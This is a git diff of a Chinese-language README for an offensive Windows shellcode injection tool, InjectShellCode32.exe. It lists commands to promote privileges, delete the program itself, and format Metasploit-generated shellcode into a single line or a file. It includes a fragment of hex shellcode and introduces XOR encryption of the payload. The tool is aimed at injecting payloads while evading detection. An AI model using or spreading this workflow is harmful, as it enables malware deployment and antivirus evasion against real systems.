@@ -42,26 +42,30 @@ InjectShellCode32.exe --promote
 ```
 
  - 删除自身程序
-```
+```C
 InjectShellCode32.exe --delself
 ```
 
-
-**将攻击载荷格式化为一行:** 将Metasploit生成的ShellCode载荷保存为文件，然后使用该命令直接将其格式化为一行。
-
-在保存ShellCode的时候，请不要保存头部的定义部分，只保存以下代码即可。
-```
-C:\Users\admin\Desktop> sc32.exe Format --path d://shellcode.txt
+ - 将攻击载荷格式化为一行纯字符串
+```C
+InjectShellCode32.exe Format --path d://shellcode.txt
 
 fce88f0000006089e531d2648b52308b520c8b52148b722831ff0fb74a2631c0ac3c601d630000687773325f54684......
 ```
 
-**将攻击载荷格式化并写出:** 这个格式化函数作用与上方相同，只不过可以直接写出到文件中，在你只有一个cmd权限时，可以使用。
+ - 将攻击载荷格式化为一行并写出到文本
+```C
+InjectShellCode32.exe FormatFile --path d://shellcode.txt --output d://format.txt
 ```
-C:\Users\admin\Desktop> sc32.exe FormatFile --path d://shellcode.txt --output d://format.txt
 
-[+] 已储存 => d://format.txt
-```
+
+
+
+
+
+
+
+
 
 **加密/解密攻击载荷:** 如上我们可以将shellcode压缩为一行，然后可以调用xor命令，对这段shellcode进行加密处理。
 ```
